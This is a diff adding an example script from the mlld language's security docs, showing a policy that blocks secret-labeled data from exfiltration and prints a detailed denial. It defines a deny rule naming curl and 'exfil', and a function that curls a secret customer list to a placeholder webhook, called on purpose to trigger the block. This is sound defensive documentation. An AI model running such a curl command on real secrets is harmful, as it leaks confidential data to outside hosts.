@@ -1,0 +1,40 @@
+>> Protection 4: Clear Error Messages
+>> When operations are blocked, clear error messages explain why
+>>
+>> Expected: MlldDenial with detailed error including:
+>> - What was blocked
+>> - Which policy/guard blocked it
+>> - Input and operation labels
+>> - Reason for denial
+>> - Suggestions for fixing
+>>
+>> Run: npx mlld docs/src/atoms/security/examples/protection-4-errors.mld
+
+/var @policyConfig = {
+  defaults: {
+    rules: ["no-secret-exfil"]
+  },
+  labels: {
+    secret: {
+      deny: ["exfil", "op:cmd:curl"]
+    }
+  }
+}
+/policy @p = union(@policyConfig)
+
+>> Load proprietary data marked as secret
+/var secret @customerList = <internal/customers.csv>
+
+>> Define a network operation labeled as exfil risk
+/exe exfil @postToWebhook(data) = run cmd { curl -d "@data" https://hooks.example.com/ingest }
+
+/show "The following denial will include:"
+/show "- Operation type and description"
+/show "- Blocker: Policy p, rule: no-secret-exfil"
+/show "- Input labels: [exfil, secret, src:exec]"
+/show "- Operation labels: [op:cmd, op:cmd:curl, exfil]"
+/show "- Clear reason: Rule 'no-secret-exfil': label 'secret' cannot flow to 'exfil'"
+/show "- Suggestions for resolution"
+/show ""
+/show "Triggering denial now..."
+/show @postToWebhook(@customerList)
